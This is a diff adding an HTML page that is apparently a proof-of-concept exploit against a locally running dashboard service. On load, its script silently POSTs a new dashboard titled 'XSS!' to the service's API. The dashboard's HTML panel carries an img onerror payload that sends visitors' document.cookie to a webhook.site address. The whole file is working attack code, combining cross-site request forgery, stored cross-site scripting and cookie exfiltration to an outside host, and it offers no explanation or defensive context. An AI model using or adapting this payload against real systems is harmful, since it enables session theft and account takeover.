@@ -1,0 +1,35 @@
+<html>
+  <body>
+    <script>
+      fetch("http://localhost:3000/api/dashboards/db", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          dashboard: {
+            id: null,
+            uid: "pwned",
+            title: "XSS!",
+            schemaVersion: 39,
+            version: 0,
+            panels: [
+              {
+                id: 1,
+                type: "text",
+                title: "X",
+                gridPos: { h: 9, w: 24, x: 0, y: 0 },
+                options: {
+                  mode: "html",
+                  content: `<img src=x onerror='fetch("https://webhook.site/173fac87-7b89-4907-92e6-0feb642ee2fa/?c="+document.cookie)'>`
+                }
+              }
+            ]
+          },
+          folderId: 0,
+          overwrite: true
+        })
+      });
+    </script>
+  </body>
+</html>
